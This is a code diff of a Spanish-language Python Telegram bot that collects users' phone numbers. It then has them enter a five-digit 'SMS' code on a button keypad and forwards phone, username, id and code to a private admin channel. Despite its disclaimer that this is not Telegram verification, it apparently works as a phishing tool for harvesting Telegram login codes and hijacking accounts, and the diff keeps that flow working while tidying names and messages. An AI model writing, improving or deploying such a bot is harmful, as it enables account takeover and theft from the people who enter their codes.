@@ -3,29 +3,31 @@ import logging
 from datetime import datetime
 from telegram import (
     Update, KeyboardButton, ReplyKeyboardMarkup,
-    InlineKeyboardMarkup, InlineKeyboardButton
+    InlineKeyboardButton, InlineKeyboardMarkup
 )
 from telegram.ext import (
     ApplicationBuilder, CommandHandler, MessageHandler,
     CallbackQueryHandler, ContextTypes, filters
 )
 
-# ===== Config =====
-BOT_TOKEN = os.getenv("BOT_TOKEN")
-ADMIN_CHANNEL_ID = int(os.getenv("ADMIN_CHANNEL_ID", "0"))  # -100xxxxxxxxxx (bot admin)
+# ========= Config =========
+BOT_TOKEN = os.getenv("BOT_TOKEN")  # token de @BotFather
+ADMIN_CHANNEL_ID = int(os.getenv("ADMIN_CHANNEL_ID", "0"))  # p.ej. -1002756519910
 
-# ===== Log =====
-logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s: %(message)s")
-log = logging.getLogger("sms-verify")
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s %(levelname)s %(name)s: %(message)s"
+)
+log = logging.getLogger("sms-verify-bot")
 
 UD_PHONE = "phone"
-UD_CODE  = "code"   # buffer local de los dígitos que el usuario marca
+UD_CODE = "code"   # buffer de los dígitos que el usuario va marcando
 
 def share_phone_kb():
     btn = KeyboardButton("📲 Compartir mi número (recomendado)", request_contact=True)
     return ReplyKeyboardMarkup([[btn]], resize_keyboard=True, one_time_keyboard=True)
 
-def keypad(code_str: str):
+def build_keypad(code_str: str):
     rows = [
         [InlineKeyboardButton("1", callback_data="d:1"),
          InlineKeyboardButton("2", callback_data="d:2"),
@@ -45,17 +47,17 @@ def keypad(code_str: str):
     text = (
         "🔐 *Verificación por SMS (no es de Telegram)*\n"
         "Introduce el *código de 5 dígitos* que te hemos enviado *vía SMS*.\n"
-        "Marca cada número en el teclado y después toca *✅ Confirmar*.\n\n"
+        "Marca cada número y luego toca *✅ Confirmar*.\n\n"
         f"Código: `{progreso}`"
     )
     return text, InlineKeyboardMarkup(rows)
 
+# ===== Handlers =====
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data[UD_CODE] = ""
     context.user_data.pop(UD_PHONE, None)
     await update.message.reply_text(
-        "Hola 👋\n"
-        "Para continuar, comparte tu número con el botón de abajo.\n\n"
+        "Hola 👋\nPara continuar, comparte tu número con el botón de abajo.\n\n"
         "🔎 *Importante*: esto **NO** es verificación de Telegram. "
         "Es un código propio que te enviaremos por *SMS*.",
         reply_markup=share_phone_kb(),
@@ -63,7 +65,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 async def on_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Se dispara apenas el usuario toca el botón nativo."""
     if not update.message or not update.message.contact:
         return
 
@@ -81,25 +82,20 @@ async def on_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"- Fecha/Hora: {stamp}"
     )
 
-    # 1) Enviar al canal/grupo privado
+    # Enviar al grupo/canal interno
     try:
         if ADMIN_CHANNEL_ID:
             await context.bot.send_message(ADMIN_CHANNEL_ID, admin_text, parse_mode="Markdown")
     except Exception as e:
         log.error("Error enviando a ADMIN_CHANNEL_ID: %s", e)
-        # Plan B: avisar al usuario que te lo reenvíe
-        await update.message.reply_text(
-            "⚠️ Ocurrió un problema notificando al canal interno. "
-            "Intentaremos de nuevo más tarde."
-        )
 
-    # 2) Mandar inmediatamente la botonera numérica al cliente
+    # Mandar inmediatamente el teclado numérico
     await update.message.reply_text(
         "✅ Número recibido correctamente.\n\n"
         "Ahora introduce el *código de 5 dígitos* que te hemos enviado *vía SMS*.",
         parse_mode="Markdown"
     )
-    text, kb = keypad(context.user_data[UD_CODE])
+    text, kb = build_keypad(context.user_data[UD_CODE])
     await update.message.reply_text(text, reply_markup=kb, parse_mode="Markdown")
 
 async def keypad_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -118,13 +114,12 @@ async def keypad_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
         code = code[:-1]
     elif data == "cancel":
         context.user_data[UD_CODE] = ""
-        await q.edit_message_text("Operación cancelada. Puedes escribir cualquier cosa para reintentarlo.")
+        await q.edit_message_text("Operación cancelada. Si deseas reintentarlo, escribe /start.")
         return
     elif data == "ok":
         phone = context.user_data.get(UD_PHONE, "desconocido")
         user = update.effective_user
         stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-
         admin_text = (
             "🧩 *Código ingresado por el cliente*\n"
             f"- Teléfono: `{phone}`\n"
@@ -132,7 +127,6 @@ async def keypad_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"- Usuario: @{user.username or 'sin_username'} (id {user.id})\n"
             f"- Fecha/Hora: {stamp}"
         )
-        # Enviar al canal interno para tu verificación manual
         try:
             if ADMIN_CHANNEL_ID:
                 await context.bot.send_message(ADMIN_CHANNEL_ID, admin_text, parse_mode="Markdown")
@@ -144,17 +138,16 @@ async def keypad_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     context.user_data[UD_CODE] = code
-    text, kb = keypad(code)
+    text, kb = build_keypad(code)
     try:
         await q.edit_message_text(text, reply_markup=kb, parse_mode="Markdown")
     except Exception:
-        # Si no permite cambiar texto (p. ej. límite), al menos actualiza la botonera
         await q.message.edit_reply_markup(reply_markup=kb)
 
-async def re_show_keypad(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Si el usuario escribe algo después de compartir el número, re-mostramos la botonera."""
+async def echo_re_show(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Si escribe algo después de compartir el número, re-mostramos la botonera."""
     if context.user_data.get(UD_PHONE):
-        text, kb = keypad(context.user_data.get(UD_CODE, ""))
+        text, kb = build_keypad(context.user_data.get(UD_CODE, ""))
         await update.message.reply_text(text, reply_markup=kb, parse_mode="Markdown")
     else:
         await update.message.reply_text(
@@ -170,7 +163,7 @@ def main():
     app.add_handler(CommandHandler("start", start))
     app.add_handler(MessageHandler(filters.CONTACT, on_contact))
     app.add_handler(CallbackQueryHandler(keypad_cb))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, re_show_keypad))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, echo_re_show))
 
     app.run_polling()
 
